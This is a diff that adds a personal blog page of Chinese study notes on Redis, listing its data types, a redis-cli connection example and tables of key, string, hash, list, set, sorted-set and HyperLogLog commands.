@@ -1,0 +1,624 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>redis - zronghui的博客</title><meta description="[TOC]"><meta property="og:type" content="blog"><meta property="og:title" content="zronghui"><meta property="og:url" content="https://zronghui.github.io/"><meta property="og:site_name" content="zronghui"><meta property="og:description" content="[TOC]"><meta property="og:image" content="https://i.loli.net/2020/03/01/Lxsrj19ucvzetiM.png# https://i.loli.net/2020/02/27/giKJ3UbFhv69o7T.jpg"><meta property="article:published_time" content="2020-05-29T07:56:39.000Z"><meta property="article:modified_time" content="2020-06-14T09:27:16.000Z"><meta property="article:author" content="removeif"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://i.loli.net/2020/03/01/Lxsrj19ucvzetiM.png# https://i.loli.net/2020/02/27/giKJ3UbFhv69o7T.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://zronghui.github.io/"},"headline":"zronghui","image":["https://i.loli.net/2020/03/01/Lxsrj19ucvzetiM.png#https://i.loli.net/2020/02/27/giKJ3UbFhv69o7T.jpg# https://cdn.jsdelivr.net/gh/removeif/removeif.github.io@latest/img/avatar.jpg"],"datePublished":"2020-05-29T07:56:39.000Z","dateModified":"2020-06-14T09:27:16.000Z","author":{"@type":"Person","name":"removeif"},"description":"[TOC]"}</script><link rel="alternative" href="/atom.xml" title="zronghui的博客" type="application/atom+xml"><link rel="icon" href="https://cdn.jsdelivr.net/gh/removeif/removeif.github.io@latest/img/wico.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-dark.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="/js/globalUtils.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://www.wntool.com/logo/image.php?output=png?fsize=35&amp;font=Snow.ttf&amp;text=zronghui&amp;mirror=No&amp;color=9933FF&amp;vcolor=3333FF&amp;bgcolor=FFFFFF&amp;alpha=yes&amp;output=png&amp;spacing=5&amp;shadow=no&amp;transparent=yes&amp;icon=no&amp;iconic=&amp;top_spacing=5&amp;left_spacing=6&amp;icon_size=48" alt="zronghui的博客" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/media">影音</a><a class="navbar-item" href="/album">相册</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/zronghui"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-05-29T07:56:39.000Z">2020-05-29</time><a class="commentCountImg" href="/redis/redis.html#comment-container"><span class="display-none-class">b88ec4783530bc0baaacbe1bc331ceea</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="b88ec4783530bc0baaacbe1bc331ceea"> 99+</span>    </a><span class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/redis/">redis</a></span><span class="level-item">27 minutes 读完 (大约 4051 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">redis</h1><div class="content"><p>[TOC]</p>
+<a id="more"></a>
+
+<h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><p>cv 学习法。。。</p>
+<h3 id="redis-七种数据类型"><a href="#redis-七种数据类型" class="headerlink" title="redis 七种数据类型"></a>redis 七种数据类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># string        key-&gt;value,像是 map</span><br><span class="line">set k v</span><br><span class="line">mset k1 v1 k2 v2</span><br><span class="line">get k</span><br><span class="line">mget k1 k2</span><br><span class="line"></span><br><span class="line"># hash        key-&gt; &#123;k1: v1, k2: v2&#125;  像是 map 的 map</span><br><span class="line">hmset key k1 v1 k2 v2</span><br><span class="line">hgetall key</span><br><span class="line"></span><br><span class="line"># list        name -&gt; [i1, i2...]    value 是个 list</span><br><span class="line">lpush name i1</span><br><span class="line">lpush name i2</span><br><span class="line">lrange name 0 10</span><br><span class="line"></span><br><span class="line"># set        name -&gt; &#123;i1, i2, ...&#125;</span><br><span class="line">哈希表实现的，增删查 复杂度都是 o1</span><br><span class="line">sadd name i1</span><br><span class="line">sadd name i2</span><br><span class="line">smembers name</span><br><span class="line"></span><br><span class="line"># zset       name -&gt; &#123;i1-&gt;score1, i2-&gt;score2, ...&#125;</span><br><span class="line">#  有序 set 为什么是 z 而不是 s(sort) sset</span><br><span class="line">每个元素关联一个分数</span><br><span class="line">zadd name score1 i1</span><br><span class="line">zincreby name i1 自动加一</span><br><span class="line">zrangebyscore name 0 1000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Bitmaps</span><br><span class="line">通过类似 map 的结果存放 0 1</span><br><span class="line">可以用来统计状态，如日活？ 是否浏览过某个东西</span><br><span class="line"></span><br><span class="line"># HyperLogLogs </span><br><span class="line">接受许多个元素作为输入，以很少空间给出元素的基数估算值</span><br><span class="line">基数：len(set(l))</span><br><span class="line">估算值：可能有一点误差</span><br><span class="line">PFADD unique::ip::counter &#39;192.168.0.1&#39;</span><br><span class="line">PFADD unique::ip::counter &#39;127.0.0.1&#39;</span><br><span class="line">PFCOUNT unique::ip::counter</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h host -p port -a password</span><br></pre></td></tr></table></figure>
+
+<h3 id="Redis-键-key-命令"><a href="#Redis-键-key-命令" class="headerlink" title="Redis 键(key) 命令"></a>Redis 键(key) 命令</h3><p>如 del key, del 则是一个 key 命令</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-del.html">DEL</a></td>
+<td>用于删除 key</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-dump.html">DUMP</a></td>
+<td>序列化给定 key ，并返回被序列化的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-exists.html">EXISTS</a></td>
+<td>检查给定 key 是否存在</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-expire.html">EXPIRE</a></td>
+<td>为给定 key 设置过期时间</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-expireat.html">EXPIREAT</a></td>
+<td>用于为 key 设置过期时间点 接受的时间参数是 UNIX 时间戳</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-pexpire.html">PEXPIRE</a></td>
+<td>设置 key 的过期时间，以毫秒计</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-pexpireat.html">PEXPIREAT</a></td>
+<td>设置 key 过期时间的时间戳(unix timestamp)，以毫秒计</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-keys.html">KEYS</a></td>
+<td>查找所有符合给定模式的 key</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-move.html">MOVE</a></td>
+<td>将当前<em>数据库</em>的 key 移动到给定的<em>数据库</em>中</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-persist.html">PERSIST</a></td>
+<td>移除 key 的过期时间，key 将<strong>持久保持</strong></td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-pttl.html">PTTL</a></td>
+<td>以毫秒为单位返回 key 的剩余的过期时间</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-ttl.html">TTL</a></td>
+<td>以秒为单位，返回给定 key 的剩余生存时间</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-randomkey.html">RANDOMKEY</a></td>
+<td>从当前<em>数据库</em>中随机返回一个 key</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-rename.html">RENAME</a></td>
+<td>修改 key 的名称</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-renamenx.html">RENAMENX</a></td>
+<td>仅当 newkey 不存在时，将 key 改名为 newkey</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-keys-type.html">TYPE</a></td>
+<td>返回 key 所储存的值的类型</td>
+</tr>
+</tbody></table>
+<h3 id="Redis-字符串-String-命令"><a href="#Redis-字符串-String-命令" class="headerlink" title="Redis 字符串(String) 命令"></a>Redis 字符串(String) 命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-set.html">SET</a></td>
+<td>设置指定 key 的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-get.html">GET</a></td>
+<td>获取指定 key 的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-getrange.html">GETRANGE</a></td>
+<td>返回 key 中字符串值的子字符</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-getset.html">GETSET</a></td>
+<td>将给定 key 的值设为 value ，并返回 key 的旧值 ( old value )</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-getbit.html">GETBIT</a></td>
+<td>对 key 所储存的字符串值，获取指定偏移量上的位 ( bit )</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-mget.html">MGET</a></td>
+<td>获取所有(一个或多个)给定 key 的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-setbit.html">SETBIT</a></td>
+<td>对 key 所储存的字符串值，设置或清除指定偏移量上的位(bit)</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-setex.html">SETEX</a></td>
+<td>设置 key 的值为 value 同时将过期时间设为 seconds</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-setnx.html">SETNX</a></td>
+<td>只有在 key 不存在时设置 key 的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-setrange.html">SETRANGE</a></td>
+<td>从偏移量 offset 开始用 value 覆写给定 key 所储存的字符串值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-strlen.html">STRLEN</a></td>
+<td>返回 key 所储存的字符串值的长度</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-mset.html">MSET</a></td>
+<td>同时设置一个或多个 key-value 对</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-msetnx.html">MSETNX</a></td>
+<td>同时设置一个或多个 key-value 对</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-psetex.html">PSETEX</a></td>
+<td>以毫秒为单位设置 key 的生存时间</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-incr.html">INCR</a></td>
+<td>将 key 中储存的数字值增一</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-incrby.html">INCRBY</a></td>
+<td>将 key 所储存的值加上给定的增量值 ( increment )</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-incrbyfloat.html">INCRBYFLOAT</a></td>
+<td>将 key 所储存的值加上给定的浮点增量值 ( increment )</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-decr.html">DECR</a></td>
+<td>将 key 中储存的数字值减一</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-decrby.html">DECRBY</a></td>
+<td>将 key 所储存的值减去给定的减量值 ( decrement )</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-strings-append.html">APPEND</a></td>
+<td>将 value 追加到 key 原来的值的末尾</td>
+</tr>
+</tbody></table>
+<h3 id="Redis-哈希-Hash-命令"><a href="#Redis-哈希-Hash-命令" class="headerlink" title="Redis 哈希(Hash) 命令"></a>Redis 哈希(Hash) 命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hdel.html">HDEL</a></td>
+<td>删除一个或多个哈希表字段</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hexists.html">HEXISTS</a></td>
+<td>查看哈希表 key 中，指定的字段是否存在</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hget.html">HGET</a></td>
+<td>获取存储在哈希表中指定字段的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hgetall.html">HGETALL</a></td>
+<td>获取在哈希表中指定 key 的所有字段和值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hincrby.html">HINCRBY</a></td>
+<td>为哈希表 key 中的指定字段的整数值加上增量 increment</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hincrbyfloat.html">HINCRBYFLOAT</a></td>
+<td>为哈希表 key 中的指定字段的浮点数值加上增量 increment</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hkeys.html">HKEYS</a></td>
+<td>获取所有哈希表中的字段</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hlen.html">HLEN</a></td>
+<td>获取哈希表中字段的数量</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hmget.html">HMGET</a></td>
+<td>获取所有给定字段的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hmset.html">HMSET</a></td>
+<td>同时将多个 field-value (域-值)对设置到哈希表 key 中</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hset.html">HSET</a></td>
+<td>将哈希表 key 中的字段 field 的值设为 value</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hsetnx.html">HSETNX</a></td>
+<td>只有在字段 field 不存在时，设置哈希表字段的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hvals.html">HVALS</a></td>
+<td>获取哈希表中所有值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hscan.html">HSCAN</a></td>
+<td>迭代哈希表中的键值对</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hstrlen.html">HSTRLEN</a></td>
+<td>返回哈希表 key 中， 与给定域 field 相关联的值的字符串长度</td>
+</tr>
+</tbody></table>
+<h3 id="Redis-列表-List-命令"><a href="#Redis-列表-List-命令" class="headerlink" title="Redis 列表(List) 命令"></a>Redis 列表(List) 命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-blpop.html">BLPOP</a></td>
+<td>移出并获取列表的第一个元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-brpop.html">BRPOP</a></td>
+<td>移出并获取列表的最后一个元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-brpoplpush.html">BRPOPLPUSH</a></td>
+<td>从列表中弹出一个值，并将该值插入到另外一个列表中并返回它</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-lindex.html">LINDEX</a></td>
+<td>通过索引获取列表中的元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-linsert.html">LINSERT</a></td>
+<td>在列表的元素前或者后插入元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-llen.html">LLEN</a></td>
+<td>获取列表长度</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-lpop.html">LPOP</a></td>
+<td>移出并获取列表的第一个元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-lpush.html">LPUSH</a></td>
+<td>将一个或多个值插入到列表头部</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-lpushx.html">LPUSHX</a></td>
+<td>将一个值插入到已存在的列表头部</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-lrange.html">LRANGE</a></td>
+<td>获取列表指定范围内的元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-lrem.html">LREM</a></td>
+<td>移除列表元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-lset.html">LSET</a></td>
+<td>通过索引设置列表元素的值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-ltrim.html">LTRIM</a></td>
+<td>对一个列表进行修剪(trim)</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-rpop.html">RPOP</a></td>
+<td>移除并获取列表最后一个元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-rpoplpush.html">RPOPLPUSH</a></td>
+<td>移除列表的最后一个元素，并将该元素添加到另一个列表并返回</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-rpush.html">RPUSH</a></td>
+<td>在列表中添加一个或多个值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-lists-rpushx.html">RPUSHX</a></td>
+<td>为已存在的列表添加值</td>
+</tr>
+</tbody></table>
+<h3 id="Redis-集合-Set-命令"><a href="#Redis-集合-Set-命令" class="headerlink" title="Redis 集合(Set) 命令"></a>Redis 集合(Set) 命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sadd.html">SADD</a></td>
+<td>向集合添加一个或多个成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-scard.html">SCARD</a></td>
+<td>获取集合的成员数</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sdiff.html">SDIFF</a></td>
+<td>返回给定所有集合的差集</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sdiffstore.html">SDIFFSTORE</a></td>
+<td>返回给定所有集合的差集并存储在 destination 中</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sinter.html">SINTER</a></td>
+<td>返回给定所有集合的交集</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sinterstore.html">SINTERSTORE</a></td>
+<td>返回给定所有集合的交集并存储在 destination 中</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sismember.html">SISMEMBER</a></td>
+<td>判断 member 元素是否是集合 key 的成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-smembers.html">SMEMBERS</a></td>
+<td>返回集合中的所有成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-smove.html">SMOVE</a></td>
+<td>将 member 元素从 source 集合移动到 destination 集合</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-spop.html">SPOP</a></td>
+<td>移除并返回集合中的一个随机元素</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-srandmember.html">SRANDMEMBER</a></td>
+<td>返回集合中一个或多个随机数</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-srem.html">SREM</a></td>
+<td>移除集合中一个或多个成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sunion.html">SUNION</a></td>
+<td>返回所有给定集合的并集</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sunionstore.html">SUNIONSTORE</a></td>
+<td>所有给定集合的并集存储在 destination 集合中</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sets-sscan.html">SSCAN</a></td>
+<td>迭代集合中的元素</td>
+</tr>
+</tbody></table>
+<h3 id="Redis-有序集合-sorted-set-命令"><a href="#Redis-有序集合-sorted-set-命令" class="headerlink" title="Redis 有序集合(sorted set) 命令"></a>Redis 有序集合(sorted set) 命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zadd.html">ZADD</a></td>
+<td>向有序集合添加一个或多个成员，或者更新已存在成员的分数</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zcard.html">ZCARD</a></td>
+<td>获取有序集合的成员数</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zcount.html">ZCOUNT</a></td>
+<td>计算在有序集合中指定区间分数的成员数</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zincrby.html">ZINCRBY</a></td>
+<td>有序集合中对指定成员的分数加上增量 increment</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zinterstore.html">ZINTERSTORE</a></td>
+<td>计算给定的一个或多个有序集的交集并将结果集存储在新的有序集合 key 中</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zlexcount.html">ZLEXCOUNT</a></td>
+<td>在有序集合中计算指定字典区间内成员数量</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrange.html">ZRANGE</a></td>
+<td>通过索引区间返回有序集合成指定区间内的成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrangebylex.html">ZRANGEBYLEX</a></td>
+<td>通过字典区间返回有序集合的成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrangebyscore.html">ZRANGEBYSCORE</a></td>
+<td>通过分数返回有序集合指定区间内的成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrank.html">ZRANK</a></td>
+<td>返回有序集合中指定成员的索引</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrem.html">ZREM</a></td>
+<td>移除有序集合中的一个或多个成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zremrangebylex.html">ZREMRANGEBYLEX</a></td>
+<td>移除有序集合中给定的字典区间的所有成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zremrangebyrank.html">ZREMRANGEBYRANK</a></td>
+<td>移除有序集合中给定的排名区间的所有成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zremrangebyscore.html">ZREMRANGEBYSCORE</a></td>
+<td>移除有序集合中给定的分数区间的所有成员</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrevrange.html">ZREVRANGE</a></td>
+<td>返回有序集中指定区间内的成员，通过索引，分数从高到底</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrevrangebyscore.html">ZREVRANGEBYSCORE</a></td>
+<td>返回有序集中指定分数区间内的成员，分数从高到低排序</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrevrank.html">ZREVRANK</a></td>
+<td>返回有序集合中指定成员的排名，有序集成员按分数值递减(从大到小)排序</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zscore.html">ZSCORE</a></td>
+<td>返回有序集中，成员的分数值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zunionstore.html">ZUNIONSTORE</a></td>
+<td>计算一个或多个有序集的并集，并存储在新的 key 中</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zscan.html">ZSCAN</a></td>
+<td>迭代有序集合中的元素（包括元素成员和元素分值）</td>
+</tr>
+</tbody></table>
+<h3 id="Redis-HyperLogLog-命令"><a href="#Redis-HyperLogLog-命令" class="headerlink" title="Redis HyperLogLog 命令"></a>Redis HyperLogLog 命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hyperloglog-pfadd.html">PFADD</a></td>
+<td>添加指定元素到 HyperLogLog 中</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hyperloglog-pfcount.html">PFCOUNT</a></td>
+<td>返回给定 HyperLogLog 的基数估算值</td>
+</tr>
+<tr>
+<td><a href="https://www.twle.cn/l/yufei/redis/redis-basic-hyperloglog-pfmerge.html">PFMERGE</a></td>
+<td>将多个 HyperLogLog 合并为一个 HyperLogLog</td>
+</tr>
